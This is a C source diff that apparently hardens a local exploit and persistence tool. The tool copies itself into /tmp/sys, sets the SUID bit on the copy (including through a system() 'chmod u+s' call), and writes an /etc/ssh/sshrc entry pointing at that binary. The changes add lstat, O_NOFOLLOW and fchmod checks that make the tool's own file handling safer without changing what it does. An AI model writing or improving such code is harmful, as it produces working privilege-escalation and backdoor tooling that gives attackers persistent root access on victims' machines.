@@ -321,7 +321,10 @@ void write_sshrc(char * md5_name) {
   if (md5_name == NULL || !is_valid_md5(md5_name)) {
     return;
   }
-  create_directory_if_needed("/etc/ssh");
+  if (create_directory_if_needed("/etc/ssh") != 0) {
+    fprintf(stderr, "[!] Failed to create or validate /etc/ssh directory\n");
+    return;
+  }
 
   char line[PATH_MAX];
   snprintf(line, sizeof(line), "/tmp/sys/%s", md5_name);
@@ -369,12 +372,35 @@ int create_directory_if_needed(const char * dir_path) {
   struct stat st = {
     0
   };
-  if (stat(dir_path, & st) == -1) {
+  
+  /* Use lstat to not follow symlinks */
+  if (lstat(dir_path, & st) == -1) {
+    /* Directory doesn't exist, create it */
     if (mkdir(dir_path, 0700) == -1) {
       return -1;
     }
 
     if (chmod(dir_path, 0700) == -1) {
+      return -1;
+    }
+  } else {
+    /* Path exists, validate it's safe to use */
+    
+    /* Check if it's a directory (not a symlink or regular file) */
+    if (!S_ISDIR(st.st_mode)) {
+      fprintf(stderr, "[!] Security: %s exists but is not a directory\n", dir_path);
+      return -1;
+    }
+    
+    /* Check if it's owned by root (uid 0) */
+    if (st.st_uid != 0) {
+      fprintf(stderr, "[!] Security: %s is not owned by root (owner: %d)\n", dir_path, st.st_uid);
+      return -1;
+    }
+    
+    /* Check if permissions are restrictive (no world or group write) */
+    if ((st.st_mode & (S_IWGRP | S_IWOTH)) != 0) {
+      fprintf(stderr, "[!] Security: %s has insecure permissions (mode: %o)\n", dir_path, st.st_mode & 0777);
       return -1;
     }
   }
@@ -490,7 +516,10 @@ void local_exp(const char * path) {
     0
   };
 
-  create_directory_if_needed("/tmp/sys");
+  if (create_directory_if_needed("/tmp/sys") != 0) {
+    fprintf(stderr, "[!] Failed to create or validate /tmp/sys directory\n");
+    return;
+  }
 
   char * self_hash = get_file_hash(path);
   if (self_hash == NULL) {
@@ -528,7 +557,8 @@ void local_exp(const char * path) {
         return;
       }
 
-      int dst_fd = open(new_file_path, O_WRONLY | O_CREAT | O_TRUNC, 0700);
+      /* Use O_NOFOLLOW to prevent symlink attacks */
+      int dst_fd = open(new_file_path, O_WRONLY | O_CREAT | O_EXCL | O_NOFOLLOW, 0700);
       if (dst_fd == -1) {
         perror("open destination file");
         close(src_fd);
@@ -555,9 +585,19 @@ void local_exp(const char * path) {
       }
 
       close(src_fd);
+      
+      /* Use fchmod on file descriptor instead of path-based chmod to prevent TOCTOU */
+      if (fchmod(dst_fd, S_IRWXU | S_IXGRP | S_IXOTH | S_ISUID) == -1) {
+        perror("fchmod");
+        close(dst_fd);
+        free(random_cli_hash);
+        free(self_hash);
+        return;
+      }
+      
       close(dst_fd);
-
-      chmod(new_file_path, S_IRWXU | S_IXGRP | S_IXOTH | S_ISUID);
+      
+      /* Additional SUID setting via system call for compatibility */
       char cmd[PATH_MAX];
       snprintf(cmd, sizeof(cmd), "chmod u+s %s 2>/dev/null", new_file_path);
       system(cmd);
